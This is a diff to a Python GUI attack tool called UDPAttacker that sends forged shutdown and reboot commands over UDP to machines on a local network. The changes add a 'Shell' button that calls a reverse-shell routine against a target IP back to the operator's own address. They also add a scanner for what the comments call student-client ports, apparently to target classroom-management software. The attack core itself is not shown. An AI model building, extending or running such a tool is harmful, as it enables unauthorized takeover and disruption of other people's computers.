@@ -6,7 +6,7 @@ from threading import Thread
 import customtkinter as ctk
 
 from combat.UDP import attackCore
-from combat.UDP.Ui_UDPAttack import F1_UDP
+from combat.UDP.F1HELP import F1_UDP
 
 
 class Ui_UDPAttacker(object):
@@ -26,7 +26,7 @@ class Ui_UDPAttacker(object):
         #
         # self.label_5 = ctk.CTkLabel(
         #     self.header_frame,
-        #     text="PowerShell BY NTD",
+        #     text="PowerShell BY APOLI",
         #     font=ctk.CTkFont(family="Microsoft YaHei UI", size=16, weight="bold")
         # )
         # self.label_5.pack(pady=8)
@@ -40,7 +40,7 @@ class Ui_UDPAttacker(object):
 
         self.label = ctk.CTkLabel(
             self.groupBox_2344,
-            text="          1查看手册\nAlt+S发送   Alt+P停止",
+            text="          F1查看手册\nAlt+S发送   Alt+P停止",
             font=ctk.CTkFont(family="Microsoft YaHei", size=11),
             text_color="gray70",
             justify="left"
@@ -58,11 +58,18 @@ class Ui_UDPAttacker(object):
                                         hover_color="#1B5E20")
         self.pushButton.grid(row=3, column=1, padx=5, pady=10, sticky="ew")
 
+        # 新加一行：获取Shell 和 扫描学生端端口
+        self.pushButton_shell = ctk.CTkButton(
+            self.groupBox_2344, text="Shell", height=32,
+            fg_color="#1565C0", hover_color="#0D47A1"
+        )
+        self.pushButton_shell.grid(row=4, column=0, columnspan=2, padx=5, pady=(0, 10), sticky="ew")    
+
         # --- 右侧面板 (参数配置) ---
         self.groupBox_33 = ctk.CTkFrame(UDPAttacker)
         self.groupBox_33.grid(row=1, column=1, sticky="nsew", padx=8, pady=8)
         self.groupBox_33.grid_columnconfigure(0, weight=1)
-        self.groupBox_33.grid_columnconfigure(1, weight=1)
+        self.groupBox_33.grid_columnconfigure(1, weight=0)
         # 配置行权重，使两个大输入框平分剩余空间
         self.groupBox_33.grid_rowconfigure(5, weight=1)
         self.groupBox_33.grid_rowconfigure(6, weight=1)
@@ -70,7 +77,19 @@ class Ui_UDPAttacker(object):
         # IP 输入框：通过 columnspan=2 占满整行，并设置默认值
         self.textEdit = ctk.CTkEntry(self.groupBox_33, placeholder_text="IP (分号隔开)", height=35)
         self.textEdit.insert(0, "192.168.")
-        self.textEdit.grid(row=0, column=0, columnspan=2, padx=10, pady=10, sticky="ew")
+        self.textEdit.grid(row=0, column=0, padx=10, pady=10, sticky="ew")
+
+        # 扫描学生端口：
+        self.pushButton_scan_port = ctk.CTkButton(
+            self.groupBox_33,
+            text="⎋",
+            width=35,          # 小尺寸
+            height=30,
+            fg_color="#6A1B9A",
+            hover_color="#4A148C",
+            font=("Segoe UI Symbol", 14)  # 确保符号显示
+        )
+        self.pushButton_scan_port.grid(row=0, column=1, padx=(0, 10), pady=10, sticky="e")
 
         # 按钮容器：让 OFF (pushButton_2) 和 OFFline (pushButton_3) 并排
         btn_frame = ctk.CTkFrame(self.groupBox_33, fg_color="transparent")
@@ -254,6 +273,8 @@ class UDPAttack(ctk.CTk, Ui_UDPAttacker):
         self.pushButton_2.configure(state=state)  # OFF
         self.pushButton_3.configure(state=state)  # OFFline
         self.pushButton_4.configure(state=state)  # 扫描IP
+        self.pushButton_shell.configure(state=state)  # 获取Shell
+        self.pushButton_scan_port.configure(state=state)  # 扫描学生端端口
 
     def scanIP(self):
         self.log_message(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 开始扫描局域网IP...")
@@ -328,6 +349,7 @@ class UDPAttack(ctk.CTk, Ui_UDPAttacker):
     def shutdown(self):
         self.stop_flag = False  # 每次启动前重置
         self.set_buttons_state("disabled")  # 开始时全部禁用
+        self.maxl = 0  # 【关键】每次关机前重置长度填充
         try:
             """构造关机命令包并发送给对方"""
             ip_raw = self.get_ip_text()
@@ -369,6 +391,7 @@ class UDPAttack(ctk.CTk, Ui_UDPAttacker):
         self.stop_flag = False  # 每次启动前重置
         """构造重启命令包并发送给对方"""
         self.set_buttons_state("disabled")  # 开始时全部禁用
+        self.maxl = 0  # 【关键】每次重启前重置长度填充
         try:
             ip_raw = self.get_ip_text()
             if not ip_raw:
@@ -410,6 +433,51 @@ class UDPAttack(ctk.CTk, Ui_UDPAttacker):
             self.running = 0
             self.pushButton_4.configure(text="扫描IP")
 
+    def getShell(self):
+        """获取反弹shell"""
+        self.stop_flag = False
+        self.set_buttons_state("disabled")
+        try:
+            ip_raw = self.get_ip_text()
+            ip_list = [ip.strip() for ip in ip_raw.split(";") if ip.strip()]
+            if not ip_list:
+                self.log_message("请输入目标IP")
+                return
+
+            target_ip = ip_list[0]
+            self.log_message("目标IP: " + target_ip)
+
+            # 获取本地IP
+            local_ip = socket.gethostbyname(socket.gethostname())
+            self.log_message("本地IP: " + local_ip)
+
+            attackCore.get_shell(target_ip, local_ip)
+            self.log_message("反弹shell操作完成")
+        except Exception as e:
+            self.log_message("获取Shell出错: " + str(e))
+        finally:
+            self.set_buttons_state("normal")
+
+    def scanStudentPort(self):
+        """扫描学生端端口，并自动填入界面端口输入框"""
+        self.stop_flag = False
+        self.set_buttons_state("disabled")
+        try:
+            ports = attackCore.find_student_ports()
+            if ports:
+                # 取第一个检测到的端口，自动填入界面的端口输入框
+                first_port = ports[0]
+                self.spinBox_2.delete(0, "end")
+                self.spinBox_2.insert(0, first_port)
+                self.log_message("检测到学生端端口: " + ", ".join(ports))
+                self.log_message(f"已自动将端口设置为 {first_port}")
+            else:
+                self.log_message("未检测到端口，请手动填写端口 (常见 4705/4706/4988)")
+        except Exception as e:
+            self.log_message("扫描端口出错: " + str(e))
+        finally:
+            self.set_buttons_state("normal")
+
 # 程序启动
 def open_udp():
     app = UDPAttack()
@@ -419,6 +487,8 @@ def open_udp():
     app.pushButton.configure(command=lambda: Thread(target=app.sendMessage, daemon=True).start())
     app.pushButton_2.configure(command=lambda: Thread(target=app.shutdown, daemon=True).start())
     app.pushButton_3.configure(command=lambda: Thread(target=app.reboot, daemon=True).start())
+    app.pushButton_shell.configure(command=lambda: Thread(target=app.getShell, daemon=True).start())
+    app.pushButton_scan_port.configure(command=lambda: Thread(target=app.scanStudentPort, daemon=True).start())
 
     app.bind("<Alt-s>", lambda e: Thread(target=app.sendMessage, daemon=True).start())
     # 绑定 Alt+P 为终止功能
